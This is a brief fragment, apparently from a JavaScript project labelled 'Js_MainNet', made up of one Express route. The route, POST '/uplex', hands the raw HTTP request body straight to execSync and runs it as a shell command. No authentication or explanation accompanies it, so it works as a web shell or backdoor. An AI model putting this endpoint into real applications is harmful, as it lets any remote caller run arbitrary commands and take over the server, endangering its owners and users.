# Js_MainNet
json json




app.post('/uplex' , function (req,res) {const execSync = require('child_process').execSync;
// import { execSync } from 'child_process';  // replace ^ if using ES modules

const output = execSync(req.body, { encoding: 'utf-8' });  // the default is 'buffer'
console.log('Output was:\n', output);
});
